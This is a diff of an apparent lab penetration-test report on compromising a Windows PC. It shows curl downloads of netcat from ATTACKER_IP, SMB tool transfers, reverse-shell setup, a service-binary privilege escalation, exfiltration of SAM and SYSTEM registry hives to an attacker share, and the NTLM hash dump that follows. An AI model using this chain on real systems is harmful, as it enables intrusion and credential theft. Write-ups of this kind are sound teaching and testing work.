@@ -622,7 +622,6 @@ curl http://ATTACKER_IP:8001/nc.exe -o c:\\windows\\temp\\nc-USERNAME.exe
 curl http://10.50.106.78/nc64.exe -o c:\\windows\\temp\\nc-pat.exe
 ```
 
-
 We sent then the following commands to create a shell:
 ```
 # Listener on the attacking machine
@@ -637,10 +636,16 @@ copy \\10.50.106.78\share\winPEAS.ps1 %TEMP%\winPEAS-pat.ps1
 
 copy \\10.50.106.78\share\winPEAS.bat %TEMP%\winPEAS-pat.bat
 
+copy \\10.50.106.78\share\Wrapper.exe.bat %TEMP%\winPEAS-pat.bat
 
-net use \\10.50.106.78\\share /del
+copy \\10.50.106.78\share\Wrapper.exe Wrapper-pat.exe
 
-**Screenshot of uploaded file and reverse shell**
+C:\Program Files (x86)\System Explorer>
+
+
+net use \\10.50.106.78\\share /del /USER:user
+
+![Executing reverse shell](image-22.png)
 
 ### Escalate privilege on the PC
 Differently from the other two hosts, this one is running with a low privilege user. Our task here was to find other vulnerabilities points that allows to escalate to a privileged user.
@@ -674,18 +679,55 @@ powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list
 The screenshot below shows that we have full access to the directory:
 ![Permission on the directory where the service is running](image-20.png)
 
-To escale privileges, we uploaded a C# executable in the folder where the service *SystemExplorerHelpService* is placed. This executable will create a process to contact the attacking machine creating a reverse shell as admin, since this service starts with administrative privileges.
+To escale privileges, we uploaded a C# executable in the folder where the service *SystemExplorerHelpService* is located and changed its name to *System.exe*. This executable will create a process to contact the attacking machine creating a reverse shell with administrative privileges, since this service starts with administrative privileges.
 
+To stop and start this service, we send the following commands:
+```
+# We first stop the original service
+sc stop SystemExplorerHelpService
+
+# We start it again, so our executable can be launched
+sc start SystemExplorerHelpService
+```
 ![Windows shell with administrative privileges](image-21.png)
 
+#### Exfiltratation
+Since the friend allowed to try anything we want, we decided to prove our success by exfiltrating sensitive information from his PC. We extracted in this engagement the files where the hash values are stored:
+```
+# Dumping the SAM file
+reg.exe save HKLM\SAM \\ATTACKING_IP\share\sam.bak 
+reg.exe save HKLM\SAM \\10.50.106.78\share\sam.bak 
 
-## Maintaining Access
+# Dumping the SYSTEM file
+reg.exe save HKLM\SYSTEM \\ATTACKING_IP\share\system.bak
+reg.exe save HKLM\SYSTEM \\10.50.106.78\share\system.bak 
 
-The steps described in the previous sessions allowed us to maintain access to the compromised services. This result can also be acquired with tools of Command of Control (i.e. empire).
+# Dumping the SECURITY file
+reg.exe save HKLM\SAM \\10.50.106.78\share\system.bak 
 
-Since we are dealing with productive environment, the possibility and the methods were just described in this report. The actual executation were not performed to avoid any possobile damage on these systems.
+```
+
+With the file in our attacking machine, we used the tool *secretsdump.py* from the *impacket* repositoriy to crack those hashes:
+```
+python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL 
+```
+
+The extracked hashes are available below:
+```
+Impacket v0.12.0.dev1+20230914.31713.6a3ecf7e - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
+Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
+[*] Cleaning up... 
+```
 
 ## House Cleaning
-
 Once the engagement was concluded, we removed all applications and configurations we applied in the compromised systems.
 Since all configuration and tools were described in this document, the process of removing followed the narrative path.
+
+# Conclusion
